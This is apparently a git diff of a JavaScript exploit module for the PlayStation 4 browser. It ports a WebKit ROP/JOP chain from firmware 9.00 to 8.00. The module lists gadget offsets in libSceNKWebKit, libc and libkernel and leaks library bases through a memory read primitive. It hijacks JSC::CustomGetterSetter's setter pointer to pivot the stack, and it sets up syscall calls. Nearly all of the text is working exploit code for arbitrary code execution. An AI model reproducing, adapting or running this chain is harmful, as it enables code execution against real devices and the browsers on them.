@@ -28,22 +28,9 @@ import {
 
 import * as off from '/module/offset.mjs';
 
-// WebKit 9.00 offsets
-const OFFSET_wk_vtable_first_element = 0x104F110;
-const OFFSET_WK___stack_chk_fail_import = 0x00000178;
-const OFFSET_WK_psl_builtin_import = 0xD68;
-const OFFSET_WKR_psl_builtin = 0x33BA0;
-const OFFSET_WK2_TLS_IMAGE = 0x38e8020;
-
-// libSceLibcInternal 9.00 offsets
-const OFFSET_libcint_memset = 0x0004F810;
-const OFFSET_libcint_setjmp = 0x000BB5BC;
-const OFFSET_libcint_longjmp = 0x000BB616;
-
-// libkernel 9.00 offsets
-const OFFSET_lk___stack_chk_fail = 0x0001FF60;
-const OFFSET_lk_pthread_create = 0x00025510;
-const OFFSET_lk_pthread_join = 0x0000AFA0;
+// WebKit offsets of imported functions
+const offset_wk_stack_chk_fail = 0x8d8;
+const offset_wk_strlen = 0x918;
 
 // libSceNKWebKit.sprx
 export let libwebkit_base = null;
@@ -52,14 +39,22 @@ export let libkernel_base = null;
 // libSceLibcInternal.sprx
 export let libc_base = null;
 
-// Gadgets aggiornati per 9.00
+// gadgets for the JOP chain
+//
+// we'll use JSC::CustomGetterSetter.m_setter to redirect execution. its
+// type is PutPropertySlot::PutValueFunc
 const jop1 = `
-mov rdi, qword ptr [rax + 8]
-call qword ptr [rax]
+mov rdi, qword ptr [rsi + 8]
+mov rax, qword ptr [rdi]
+jmp qword ptr [rax + 0x70]
 `;
+// rbp is now pushed, any extra objects pushed by the call instructions can be
+// ignored
 const jop2 = `
-mov rsp, rdi
-ret
+push rbp
+mov rbp, rsp
+mov rax, qword ptr [rdi]
+call qword ptr [rax + 0x30]
 `;
 const jop3 = `
 mov rdx, qword ptr [rdx + 0x50]
@@ -73,46 +68,63 @@ jmp qword ptr [rax]
 `;
 const jop5 = 'pop rsp; ret';
 
+// the ps4 firmware is compiled to use rbp as a frame pointer
+//
+// The JOP chain pushed rbp and moved rsp to rbp before the pivot. The chain
+// must save rbp (rsp before the pivot) somewhere if it uses it. The chain must
+// restore rbp (if needed) before the epilogue.
+//
+// The epilogue will move rbp to rsp (restore old rsp) and pop rbp (which we
+// pushed earlier before the pivot, thus restoring the old rbp).
+//
+// leave instruction equivalent:
+//     mov rsp, rbp
+//     pop rbp
+
 const webkit_gadget_offsets = new Map(Object.entries({
-    'pop rax; ret' : 0x51A12,
-    'pop rbx; ret' : 0x1F4D6,
-    'pop rcx; ret' : 0x657B7,
-    'pop rdx; ret' : 0x986C,
+    'pop rax; ret' : 0x0000000000035a1b,
+    'pop rbx; ret' : 0x000000000001537c,
+    'pop rcx; ret' : 0x0000000000025ecb,
+    'pop rdx; ret' : 0x0000000000060f52,
 
-    'pop rbp; ret' : 0x319690,
-    'pop rsi; ret' : 0x1F4D6,
-    'pop rdi; ret' : 0x319690,
-    'pop rsp; ret' : 0x4E293,
+    'pop rbp; ret' : 0x00000000000000b6,
+    'pop rsi; ret' : 0x000000000003bd77,
+    'pop rdi; ret' : 0x00000000001e3f87,
+    'pop rsp; ret' : 0x00000000000bf669,
 
-    'pop r8; ret' : 0xAFAA71,
-    'pop r9; ret' : 0x422571,
-    'pop r10; ret' : 0x986C,
-    'pop r11; ret' : 0x566F8,
+    'pop r8; ret' : 0x0000000000097442,
+    'pop r9; ret' : 0x00000000006f501f,
+    'pop r10; ret' : 0x0000000000060f51,
+    'pop r11; ret' : 0x0000000000d2a629,
 
-    'ret' : 0x32,
-    'leave; ret' : 0x1FBBCC,
+    'pop r12; ret' : 0x0000000000d8968d,
+    'pop r13; ret' : 0x00000000016ccff1,
+    'pop r14; ret' : 0x000000000003bd76,
+    'pop r15; ret' : 0x00000000002499df,
 
-    'mov [rdi], rsi; ret' : 0x1A97920,
-    'mov [rdi], rax; ret' : 0x10788F7,
-    'mov [rax], rsi; ret' : 0x1EFD890,
-    'mov rax, [rax]; ret' : 0x241CC,
+    'ret' : 0x0000000000000032,
+    'leave; ret' : 0x0000000000291fd7,
 
-    [jop1] : 0x751EE7,
-    [jop2] : 0x2048062,
-    [jop3] : 0x3B7FE4,
-    [jop4] : 0x15A7D52,
-    [jop5] : 0x4E293,
+    'mov rax, qword ptr [rax]; ret' : 0x000000000002dc62,
+    'mov qword ptr [rdi], rax; ret' : 0x000000000005b1bb,
+    'mov dword ptr [rdi], eax; ret' : 0x000000000001f864,
+    'mov dword ptr [rax], esi; ret' : 0x00000000002915bc,
+
+    [jop1] : 0x0000000001988320,
+    [jop2] : 0x000000000076b970,
+    [jop3] : 0x0000000000f62f95,
+    [jop4] : 0x00000000021af6ad,
+    [jop5] : 0x00000000000bf669,
 }));
 
 const libc_gadget_offsets = new Map(Object.entries({
-    'getcontext' : OFFSET_libcint_setjmp,
-    'setcontext' : OFFSET_libcint_longjmp,
+    'getcontext' : 0x258f4,
+    'setcontext' : 0x29c58,
 }));
 
 const libkernel_gadget_offsets = new Map(Object.entries({
+    // returns the location of errno
     '__error' : 0x160c0,
-    'pthread_create' : OFFSET_lk_pthread_create,
-    'pthread_join' : OFFSET_lk_pthread_join,
 }));
 
 export const gadgets = new Map();
@@ -121,15 +133,18 @@ function get_bases() {
     const textarea = document.createElement('textarea');
     const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
     const textarea_vtable = webcore_textarea.readp(0);
-    const libwebkit_base = textarea_vtable.sub(OFFSET_wk_vtable_first_element);
+    const off_ta_vt = 0x236d4a0;
+    const libwebkit_base = textarea_vtable.sub(off_ta_vt);
 
-    const stack_chk_fail_import = libwebkit_base.add(OFFSET_WK___stack_chk_fail_import);
+    const stack_chk_fail_import = libwebkit_base.add(offset_wk_stack_chk_fail);
     const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
-    const libkernel_base = stack_chk_fail_addr.sub(OFFSET_lk___stack_chk_fail);
+    const off_scf = 0x12a30;
+    const libkernel_base = stack_chk_fail_addr.sub(off_scf);
 
-    const psl_builtin_import = libwebkit_base.add(OFFSET_WK_psl_builtin_import);
-    const psl_builtin_addr = resolve_import(psl_builtin_import);
-    const libc_base = psl_builtin_addr.sub(OFFSET_WKR_psl_builtin);
+    const strlen_import = libwebkit_base.add(offset_wk_strlen);
+    const strlen_addr = resolve_import(strlen_import);
+    const off_strlen = 0x4eb80;
+    const libc_base = strlen_addr.sub(off_strlen);
 
     return [
         libwebkit_base,
@@ -144,7 +159,7 @@ export function init_gadget_map(gadget_map, offset_map, base_addr) {
     }
 }
 
-class Chain900Base extends ChainBase {
+class Chain800Base extends ChainBase {
     push_end() {
         this.push_gadget('leave; ret');
     }
@@ -152,19 +167,28 @@ class Chain900Base extends ChainBase {
     push_get_retval() {
         this.push_gadget('pop rdi; ret');
         this.push_value(this.retval_addr);
-        this.push_gadget('mov [rdi], rax; ret');
+        this.push_gadget('mov qword ptr [rdi], rax; ret');
     }
 
     push_get_errno() {
         this.push_gadget('pop rdi; ret');
         this.push_value(this.errno_addr);
+
         this.push_call(this.get_gadget('__error'));
-        this.push_gadget('mov rax, [rax]; ret');
-        this.push_gadget('mov [rdi], eax; ret');
+
+        this.push_gadget('mov rax, qword ptr [rax]; ret');
+        this.push_gadget('mov dword ptr [rdi], eax; ret');
+    }
+
+    push_clear_errno() {
+        this.push_call(this.get_gadget('__error'));
+        this.push_gadget('pop rsi; ret');
+        this.push_value(0);
+        this.push_gadget('mov dword ptr [rax], esi; ret');
     }
 }
 
-export class Chain900 extends Chain900Base {
+export class Chain800 extends Chain800Base {
     constructor() {
         super();
         const [rdx, rdx_bak] = mem.gc_alloc(0x58);
@@ -180,7 +204,7 @@ export class Chain900 extends Chain900Base {
     }
 }
 
-export const Chain = Chain900;
+export const Chain = Chain800;
 
 export function init(Chain) {
     const syscall_array = [];
@@ -192,18 +216,30 @@ export function init(Chain) {
     init_syscall_array(syscall_array, libkernel_base, 300 * KB);
 
     let gs = Object.getOwnPropertyDescriptor(window, 'location').set;
+    // JSCustomGetterSetter.m_getterSetter
     gs = mem.addrof(gs).readp(0x28);
 
+    // sizeof JSC::CustomGetterSetter
     const size_cgs = 0x18;
     const [gc_buf, gc_back] = mem.gc_alloc(size_cgs);
     mem.cpy(gc_buf, gs, size_cgs);
+    // JSC::CustomGetterSetter.m_setter
     gc_buf.write64(0x10, get_gadget(gadgets, jop1));
 
     const proto = Chain.prototype;
+    // _rop must have a descriptor initially in order for the structure to pass
+    // setHasReadOnlyOrGetterSetterPropertiesExcludingProto() thus forcing a
+    // call to JSObject::putInlineSlow(). putInlineSlow() is the code path that
+    // checks for any descriptor to run
+    //
+    // the butterfly's indexing type must be something the GC won't inspect
+    // like DoubleShape. it will be used to store the JOP table's pointer
     const _rop = {get launch() {throw Error('never call')}, 0: 1.1};
+    // replace .launch with the actual custom getter/setter
     mem.addrof(_rop).write64(off.js_inline_prop, gc_buf);
     proto._rop = _rop;
 
+    // JOP table
     const rax_ptrs = new BufferView(0x100);
     const rax_ptrs_p = get_view_vector(rax_ptrs);
     proto._rax_ptrs = rax_ptrs;
